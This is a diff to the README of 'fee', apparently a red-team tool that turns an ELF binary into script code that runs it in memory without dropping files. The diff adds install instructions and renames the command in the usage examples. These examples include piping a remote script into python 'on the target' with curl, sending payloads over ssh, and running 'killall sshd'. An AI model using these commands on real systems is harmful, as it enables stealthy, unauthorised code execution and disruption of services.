@@ -18,12 +18,27 @@ The technique used for this is explained [here](https://magisterquis.github.io/2
    * Perl
    * Ruby
 
+
+### Installation
+
+Install this on your host machine using [pipx](https://github.com/pypa/pipx):
+```console
+$ pipx install fee
+```
+
+... or regular pip:
+```console
+$ pip install --user fee
+```
+
+You may also clone this repository and run the script directly.
+
 ### Usage
 
 Basic usage: supply the path to the binary you wish to drop:
 
 ```console
-$ ./fee.py /path/to/binary > output.py
+$ fee /path/to/binary > output.py
 ```
 
 You can then pipe this into Python on the target:
@@ -34,28 +49,28 @@ $ curl my.example.site/output.py | python
 
 Alternatively, you may generate Perl or Ruby code instead with the `--lang` flag (`-l`):
 ```console
-$ ./fee.py /path/to/binary -l pl | perl
+$ fee /path/to/binary -l pl | perl
 ```
 
 ```console
-$ ./fee.py /path/to/binary -l rb | ruby
+$ fee /path/to/binary -l rb | ruby
 ```
 
 If you want to pipe over ssh, use the `--with-command` flag (`-c`) to wrap the output in `python -c` (or `perl -e`, `ruby -e` accordingly):
 
 ```console
-$ ./fee.py -c /path/to/binary | ssh user@target
-``` 
+$ fee -c /path/to/binary | ssh user@target
+```
 
 When piping over ssh, you sometimes want to wrap the long line which holds the base64-encoded version of the binary, as some shells do not like super long input strings. You can accomplish this with the `--wrap` flag (`-w`):
 ```console
-$ ./fee.py -c /path/to/binary -w 64 | ssh user@target
+$ fee -c /path/to/binary -w 64 | ssh user@target
 ```
 
 If you want to customise the arguments, use the `--argv` flag (`-a`):
 
 ```console
-$ ./fee.py -a "killall sshd" ./busybox > output.py
+$ fee -a "killall sshd" ./busybox > output.py
 ```
 
 __NB!__ By default, the script parses the encoded ELF's header to determine the target architecture. This is required to use the correct syscall number when calling `memfd_create`. If this fails, you can use the `--target-architecture` (`-t`) flag to explicitly generate a syscall number. Alternatively, you can use the `libc` target to resolve the symbol automatically at runtime, although this only works when generating Python code.
@@ -63,7 +78,7 @@ For more exotic platforms, you should specify the syscall number manually. You n
 
 Full help text:
 ```
-usage: fee.py [-h] [-t ARCH | -s NUM] [-a ARGV] [-l LANG] [-c] [-p PATH] [-w CHARS] [-z LEVEL]
+usage: fee [-h] [-t ARCH | -s NUM] [-a ARGV] [-l LANG] [-c] [-p PATH] [-w CHARS] [-z LEVEL]
               path
 
 Print code to stdout to execute an ELF without dropping files.
